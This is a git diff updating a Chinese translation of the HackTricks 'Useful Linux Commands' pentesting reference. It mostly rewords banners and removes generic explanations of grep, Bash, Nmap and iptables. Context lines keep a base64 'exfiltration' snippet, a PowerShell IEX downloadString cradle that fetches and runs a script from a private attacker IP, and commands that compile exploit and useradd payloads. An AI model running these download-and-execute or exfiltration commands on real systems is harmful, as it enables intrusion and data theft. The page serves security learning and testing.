@@ -1,25 +1,28 @@
-# 有用的Linux命令
+# 实用的Linux命令
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-使用[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)可以轻松构建和自动化由全球最先进的社区工具提供支持的工作流程。
+\
+使用 [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) 轻松构建并**自动化工作流程**，由世界上**最先进**的社区工具提供支持。\
 立即获取访问权限：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>从零开始学习AWS黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS红队专家)</strong></a><strong>！</strong></summary>
 
-* 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想要访问**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获取[**官方PEASS和HackTricks衣物**](https://peass.creator-spring.com)
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
-* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**
+其他支持HackTricks的方式：
+
+* 如果您希望在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
+* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
+* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
 
-## 常见的Bash命令
+## 常用Bash
 ```bash
 #Exfiltration using Base64
 base64 -w 0 file
@@ -138,14 +141,15 @@ sudo chattr -i file.txt #Remove the bit so you can delete it
 # List files inside zip
 7z l file.zip
 ```
-<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)轻松构建和自动化由全球**最先进**的社区工具提供支持的工作流程。
+\
+使用 [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) 来轻松构建并**自动化工作流程**，这些工作流程由世界上**最先进**的社区工具提供支持。\
 立即获取访问权限：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
-## 适用于Windows的Bash
+## Bash for Windows
 ```bash
 #Base64 for Windows
 echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
@@ -166,63 +170,6 @@ python pyinstaller.py --onefile exploit.py
 i686-mingw32msvc-gcc -o executable useradd.c
 ```
 ## Greps
-
-### Introduction
-
-The `grep` command is a powerful tool used for searching text patterns within files. It is commonly used in Linux systems for various purposes, such as finding specific lines in log files, searching for keywords in source code, or filtering output from other commands.
-
-### Basic Usage
-
-The basic syntax of the `grep` command is as follows:
-
-```
-grep [options] pattern [file...]
-```
-
-- `pattern` is the text pattern you want to search for.
-- `file` is the file or files in which you want to search for the pattern. If no file is specified, `grep` will read from standard input.
-
-### Examples
-
-Here are some examples of how to use the `grep` command:
-
-1. Search for a pattern in a single file:
-
-   ```
-   grep "error" logfile.txt
-   ```
-
-   This command will search for the word "error" in the file `logfile.txt` and display all lines that contain the pattern.
-
-2. Search for a pattern in multiple files:
-
-   ```
-   grep "warning" file1.txt file2.txt file3.txt
-   ```
-
-   This command will search for the word "warning" in the files `file1.txt`, `file2.txt`, and `file3.txt` and display all lines that contain the pattern.
-
-3. Search for a pattern in all files in a directory:
-
-   ```
-   grep "TODO" *
-   ```
-
-   This command will search for the word "TODO" in all files in the current directory and display all lines that contain the pattern.
-
-### Options
-
-Here are some commonly used options with the `grep` command:
-
-- `-i`: Ignore case (search for the pattern case-insensitively).
-- `-r`: Recursively search directories.
-- `-v`: Invert the match (display lines that do not contain the pattern).
-- `-n`: Display line numbers along with the matching lines.
-- `-l`: Display only the names of files that contain the pattern.
-
-### Conclusion
-
-The `grep` command is a versatile tool for searching text patterns in files. By using different options and combinations, you can perform complex searches and filter out the desired information. Experiment with the command and explore its capabilities to make the most out of it.
 ```bash
 #Extract emails from file
 grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" file.txt
@@ -302,21 +249,7 @@ grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' *.txt > us-phones.txt
 #Extract ISBN Numbers
 egrep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" *.txt > isbn.txt
 ```
-## Nmap搜索帮助
-
-Nmap是一款功能强大的网络扫描工具，用于发现和评估网络上的主机和服务。以下是一些常用的Nmap搜索命令和选项的帮助信息：
-
-- `-sn`：使用ping扫描模式，只检测主机是否在线。
-- `-sP`：使用ping扫描模式，检测主机是否在线，并显示其MAC地址。
-- `-sS`：使用TCP SYN扫描模式，探测主机上开放的TCP端口。
-- `-sU`：使用UDP扫描模式，探测主机上开放的UDP端口。
-- `-p`：指定要扫描的端口范围，例如`-p 1-100`表示扫描1到100之间的端口。
-- `-O`：进行操作系统识别，尝试确定目标主机的操作系统类型。
-- `-A`：进行全面的扫描，包括端口扫描、操作系统识别和版本检测等。
-- `-v`：显示详细的扫描结果。
-- `-oN`：将扫描结果保存到指定的文件中。
-
-更多详细的Nmap命令和选项，请参考[Nmap官方文档](https://nmap.org/book/man.html)。
+## Nmap 搜索帮助
 ```bash
 #Nmap scripts ((default or version) and smb))
 nmap --script-help "(default or version) and *smb*"
@@ -324,109 +257,11 @@ locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | gre
 nmap --script-help "(default or version) and smb)"
 ```
 ## Bash
-
-Bash（Bourne Again SHell）是一种流行的Unix shell和命令语言。它是Linux系统中默认的shell，也可以在其他Unix系统中使用。Bash提供了一个交互式的命令行界面，允许用户执行各种操作，包括文件管理、进程控制和系统配置。
-
-### 基本命令
-
-以下是一些常用的Bash命令：
-
-- `ls`：列出当前目录中的文件和文件夹。
-- `cd`：切换到指定的目录。
-- `pwd`：显示当前工作目录的路径。
-- `mkdir`：创建一个新的目录。
-- `rm`：删除文件或目录。
-- `cp`：复制文件或目录。
-- `mv`：移动文件或目录。
-- `cat`：显示文件的内容。
-- `grep`：在文件中搜索指定的模式。
-- `chmod`：修改文件或目录的权限。
-- `chown`：修改文件或目录的所有者。
-- `ps`：显示当前运行的进程。
-- `kill`：终止指定的进程。
-
-### 管道和重定向
-
-Bash还提供了管道和重定向功能，用于处理命令的输入和输出。
-
-- 管道（`|`）：将一个命令的输出作为另一个命令的输入。例如，`ls | grep .txt`将列出当前目录中所有以`.txt`结尾的文件。
-- 重定向：可以将命令的输出重定向到文件中，或者从文件中读取输入。例如，`ls > files.txt`将将当前目录中的文件列表写入`files.txt`文件中。
-
-### 脚本编写
-
-Bash还可以用于编写脚本，以自动化一系列命令的执行。脚本文件通常以`.sh`为扩展名，并且需要设置执行权限。
-
-以下是一个简单的Bash脚本示例：
-
-```bash
-#!/bin/bash
-
-# 输出当前日期和时间
-echo "当前日期和时间："
-date
-
-# 列出当前目录中的所有文件
-echo "当前目录中的文件："
-ls
-```
-
-要执行脚本，可以使用`./`前缀，例如`./script.sh`。
-
-### 总结
-
-Bash是一种强大而灵活的命令行工具，可以帮助用户在Linux系统中进行各种操作。掌握基本的Bash命令和脚本编写技巧，将有助于提高工作效率和系统管理能力。
 ```bash
 #All bytes inside a file (except 0x20 and 0x00)
 for j in $((for i in {0..9}{0..9} {0..9}{a..f} {a..f}{0..9} {a..f}{a..f}; do echo $i; done ) | sort | grep -v "20\|00"); do echo -n -e "\x$j" >> bytes; done
 ```
 ## Iptables
-
-Iptables is a powerful firewall utility for Linux systems. It allows you to configure and manage network traffic by creating rules and chains. With iptables, you can control incoming and outgoing traffic, filter packets based on various criteria, and protect your system from unauthorized access.
-
-### Basic Usage
-
-To view the current iptables rules, use the following command:
-
-```bash
-iptables -L
-```
-
-To add a new rule, use the `iptables -A` command followed by the desired options. For example, to allow incoming SSH connections, you can use the following command:
-
-```bash
-iptables -A INPUT -p tcp --dport 22 -j ACCEPT
-```
-
-To delete a rule, use the `iptables -D` command followed by the rule number. For example, to delete the rule at position 3 in the INPUT chain, you can use the following command:
-
-```bash
-iptables -D INPUT 3
-```
-
-### Common Options
-
-Here are some common options that you can use with iptables:
-
-- `-A` (append): Adds a new rule to the end of a chain.
-- `-D` (delete): Deletes a rule from a chain.
-- `-I` (insert): Inserts a new rule at a specific position in a chain.
-- `-p` (protocol): Specifies the protocol (e.g., tcp, udp).
-- `--dport` (destination port): Specifies the destination port number.
-- `-j` (jump): Specifies the target action for the rule (e.g., ACCEPT, DROP).
-
-### Chains
-
-Iptables uses chains to organize rules. The three default chains are:
-
-- `INPUT`: Handles incoming packets.
-- `OUTPUT`: Handles outgoing packets.
-- `FORWARD`: Handles packets that are being routed through the system.
-
-You can also create your own custom chains to further organize your rules.
-
-### Conclusion
-
-Iptables is a versatile tool for managing network traffic and securing your Linux system. By understanding its basic usage and common options, you can effectively configure and control your firewall rules.
 ```bash
 #Delete curent rules and chains
 iptables --flush
@@ -459,20 +294,22 @@ iptables -P OUTPUT ACCEPT
 ```
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>从零开始学习AWS黑客攻击直至成为高手</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS红队专家)</strong></a><strong>！</strong></summary>
 
-* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
-* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **通过向** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
+支持HackTricks的其他方式：
+
+* 如果您想在**HackTricks上看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
+* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
+* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**telegram群组**](https://t.me/peass)或在**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**上关注我。**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和**自动化工作流程**，使用全球**最先进**的社区工具。\
+使用 [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) 来轻松构建并**自动化工作流程**，这些工作流程由世界上**最先进的**社区工具提供支持。\
 立即获取访问权限：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
